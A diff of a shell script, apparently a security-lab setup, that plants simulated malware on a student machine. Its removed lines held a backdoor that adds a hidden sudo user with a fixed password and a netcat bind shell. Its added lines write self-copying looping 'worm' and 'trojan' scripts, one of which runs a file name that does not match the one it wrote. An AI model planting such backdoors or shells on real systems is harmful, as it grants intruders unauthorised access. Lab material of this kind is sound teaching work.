@@ -21,24 +21,6 @@ do
   useradd -M -g sudo -p $(openssl passwd -crypt $user) $user
 done
 
-cat << 'EOF' >> /sbin/trojan.py
-#!/usr/bin/python
-import os
-import crypt
-password ="cookie"
-encPass = crypt.crypt(password,"22")
-os.system("useradd -g sudo -p "+encPass+" bagels")
-EOF
-chmod 755 /sbin/trojan.py
-/sbin/trojan.py &
-
-cat << 'EOF' >> /root/open_sesame_VIRUS.sh
-rm /tmp/d;mkfifo /tmp/d;cat /tmp/d|/bin/bash -i 2>&1|nc -l 2 >/tmp/d
-EOF
-chmod 755 /root/open_sesame_VIRUS.sh
-/root/open_sesame_VIRUS.sh &
-
-
 cat << EOF > /bin/virus.sh
 #!/bin/bash
 while true
@@ -49,3 +31,28 @@ done
 EOF
 chmod 755 /bin/virus.sh
 /bin/virus.sh &
+
+cat << EOF > /bin/worm.sh
+#!/bin/bash
+while true
+do
+  /bin/echo 'A worm is running' >>/home/student/wormFile.txt
+  sleep 60
+done
+EOF
+chmod 755 /bin/malware.sh
+/bin/malware.sh &
+
+
+cat << EOF > /bin/trojan.sh
+#!/bin/bash
+while true
+do
+  /bin/cp /bin/trojan.sh /home/student/trojan-virus
+  sleep 1
+  /home/student/trojan-virus &
+  sleep 120
+done
+EOF
+chmod 755 /bin/trojan.sh
+/bin/trojan.sh &
